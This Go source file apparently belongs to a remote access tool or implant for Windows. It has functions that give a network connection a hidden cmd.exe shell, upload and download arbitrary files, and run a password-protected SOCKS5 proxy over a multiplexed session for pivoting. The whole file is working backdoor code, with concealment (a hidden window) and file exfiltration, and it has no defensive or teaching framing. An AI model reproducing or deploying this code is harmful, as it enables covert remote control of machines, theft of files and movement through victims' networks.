package shell

import (
	"io"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"
	"syscall"

	gosocks5 "github.com/armon/go-socks5"
	"github.com/hashicorp/yamux"
)

func GetInteractiveShell(conn net.Conn) error {

	cmd := exec.Command("C:\\Windows\\System32\\cmd.exe")

	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	cmd.Stderr = conn
	cmd.Stdout = conn
	cmd.Stdin = conn

	cmd.Run()

	return nil
}

func UploadFile(conn net.Conn){
	uploadChannel := make([]byte, 1024)

	read_len, err := conn.Read(uploadChannel)

	if err != nil {
		return
	}

	filePath := strings.TrimSpace(string(uploadChannel[:read_len]))

	f,_ :=os.Create(filePath)

	defer f.Close()

	_, _ = io.Copy(f, conn)

}

func DownloadFile(conn net.Conn){
	uploadChannel := make([]byte, 1024)

	read_len, err := conn.Read(uploadChannel)

	if err != nil {
		return
	}

	filePath := strings.TrimSpace(string(uploadChannel[:read_len]))

	f,err := os.Open(filePath)

	if err!=nil{
		return
	}

	defer f.Close()

	_, _ = io.Copy(conn, f)

}

func RunSocks5Proxy(conn net.Conn){

	socksChannel := make([]byte, 1024)

	readLen, err := conn.Read(socksChannel)

	if err != nil {
		return
	}

	user := strings.TrimSpace(string(socksChannel[:readLen]))

	readLen, err = conn.Read(socksChannel)

	if err != nil {
		return
	}

	passwd := strings.TrimSpace(string(socksChannel[:readLen]))

	cfg := &gosocks5.Config{
		Logger: log.New(ioutil.Discard, "", log.LstdFlags),
	}

	cfg.Credentials = gosocks5.StaticCredentials(map[string]string{user: passwd})

	sp, err := gosocks5.New(cfg)

	session, err := yamux.Server(conn, nil)
	if err != nil {
		return
	}

	for {
		stream, err := session.Accept()
		if err != nil {
			return
		}
		go func() {
			err = sp.ServeConn(stream)
			if err != nil {
				return
			}
		}()
	}

}